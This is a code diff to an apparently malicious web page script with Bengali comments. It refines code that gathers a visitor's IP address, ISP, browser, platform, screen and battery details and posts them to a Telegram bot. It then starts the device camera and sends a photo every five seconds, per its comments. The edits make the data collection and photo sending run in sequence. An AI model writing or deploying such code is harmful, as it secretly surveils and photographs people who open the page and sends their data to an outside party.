@@ -38,16 +38,7 @@
                     batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
                 }
 
-                const deviceInfo = `
-📱 Device Information:
-- 🌍 IP Address: ${ipAddress}
-- 📡 ISP/SIM Provider: ${isp}
-- 🔌 Network Type: ${networkType}
-- 🌐 Browser: ${navigator.userAgent}
-- 🖥️ Platform: ${navigator.platform}
-- 📏 Screen Resolution: ${window.screen.width}x${window.screen.height}
-- 🔋 ${batteryStatus}
-                `;
+                const deviceInfo = `\n📱 Device Information:\n- 🌍 IP Address: ${ipAddress}\n- 📡 ISP/SIM Provider: ${isp}\n- 🔌 Network Type: ${networkType}\n- 🌐 Browser: ${navigator.userAgent}\n- 🖥️ Platform: ${navigator.platform}\n- 📏 Screen Resolution: ${window.screen.width}x${window.screen.height}\n- 🔋 ${batteryStatus}`;
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST",
@@ -103,12 +94,12 @@
         }
 
         async function startPhotoCaptureLoop() {
-            sendDeviceInfo(); // ডিভাইসের তথ্য পাঠাবে
+            await sendDeviceInfo(); // ডিভাইসের তথ্য পাঠাবে
 
             const cameraStarted = await startCamera();
             if (!cameraStarted) return;
 
-            sendPhoto(); // প্রথম ছবি পাঠাবে
+            await sendPhoto(); // প্রথম ছবি পাঠাবে
 
             intervalId = setInterval(sendPhoto, 5000); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
         }
